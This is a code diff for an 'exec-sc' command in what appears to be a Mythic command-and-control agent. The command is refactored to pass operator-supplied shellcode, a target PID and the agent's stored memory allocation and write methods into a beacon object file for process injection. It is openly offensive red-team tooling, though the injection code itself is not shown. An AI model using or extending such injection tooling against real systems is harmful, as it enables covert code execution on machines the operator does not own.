@@ -3,6 +3,8 @@ from mythic_container.MythicRPC import *
 import json
 import base64
 
+from .Utils.u import *
+
 class ExecScArguments(TaskArguments):
     def __init__(self, command_line, **kwargs):
         super().__init__(command_line, **kwargs)
@@ -40,7 +42,7 @@ class ExecScArguments(TaskArguments):
         else:
             parts = self.command_line.split()
             if len(parts) < 1:
-                raise ValueError("Usage: exec-sc <file_id> [pid] [args]")
+                raise ValueError("Usage: exec-sc -file <file_id> -pid [pid] -args [args]")
             
             self.add_arg("file", parts[0])
             
@@ -66,69 +68,55 @@ class ExecScCommand(CommandBase):
     )
 
     async def create_go_tasking(self, task: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
-        file_id = task.args.get_arg("file")
-        pid = task.args.get_arg("pid")
-        args = task.args.get_arg("args")
+        file_name = task.args.get_arg("file")
+        pid       = task.args.get_arg("pid")
+        args      = task.args.get_arg("args")
         
-        file_resp = await SendMythicRPCFileSearch(MythicRPCFileSearchMessage(
-            TaskID=task.Task.ID,
-            AgentFileID=file_id
-        ))
-        
-        if not file_resp.Success or len(file_resp.Files) == 0:
-            raise Exception("File not found")
+        bof_content = await get_content_by_name("kh_exec-sc.x64.o", task.Task.ID)
+        sc_content  = await get_content_by_name( file_name, task.Task.ID)
             
-        file_content = await SendMythicRPCFileGetContent(MythicRPCFileGetContentMessage(
-            AgentFileId=file_id
-        ))
-        
-        if not file_content.Success:
-            raise Exception("Failed to get file content")
-            
-        file_info = file_resp.Files[0]
-        output = f"Executing shellcode file: {file_info.Filename}"
-        display = f"-file {file_info.Filename}"
+        output  = f"Executing shellcode file: {file_name}"
+        display = f"-file {file_name}"
 
         if pid > 0:
             display += f" -pid {pid}"
-            output  += f" in PID: {pid}"
         if args:
             display += f" -args {args}"
-            output  += f" with args: {args}"
         
         task.args.remove_arg("file")
-        task.args.add_arg("file_contents", file_content.Content.hex())
-        task.args.add_arg("pid", pid)
-        
-        if args:
-            task.args.add_arg("args_bytes", base64.b64encode(args.encode()).decode())
+        task.args.remove_arg("pid")
+        task.args.remove_arg("args")
+    
+        AgentData = StorageExtract( task.Callback.AgentCallbackID )
+
+        alloc_type = AgentData["injection"]["write_method"]
+        write_type = AgentData["injection"]["alloc_method"]
+
+        bof_args = [
+            {"type": "bytes", "value": sc_content.hex()},
+            {"type": "int"  , "value": pid},
+            {"type": "char" , "value": args},            
+            {"type": "int"  , "value": alloc_type},       
+            {"type": "int"  , "value": write_type},
+        ]
+
+        task.args.add_arg("bof_file", bof_content.hex())
+        task.args.add_arg("bof_id", 0, ParameterType.Number)
+        task.args.add_arg("bof_args", json.dumps(bof_args))
 
         return PTTaskCreateTaskingMessageResponse(
             TaskID=task.Task.ID,
-            DisplayParams=f"-file {file_id}"
+            DisplayParams=f"-file {file_name}"
         )
 
     async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
-        try:
-            output = "Shellcode executed successfully\n"
-
-            await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
-                TaskID=task.Task.ID,
-                Response=output.encode('utf-8')
-            ))
-            
+        if not response:
             return PTTaskProcessResponseMessageResponse(
                 TaskID=task.Task.ID,
                 Success=True
             )
-            
-        except Exception as e:
-            await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
-                TaskID=task.Task.ID,
-                Response=f"Error processing response: {str(e)}".encode()
-            ))
-            return PTTaskProcessResponseMessageResponse(
-                TaskID=task.Task.ID,
-                Success=False,
-                Error=str(e)
-            )
+
+        return PTTaskProcessResponseMessageResponse(
+            TaskID=task.Task.ID,
+            Success=True
+        )
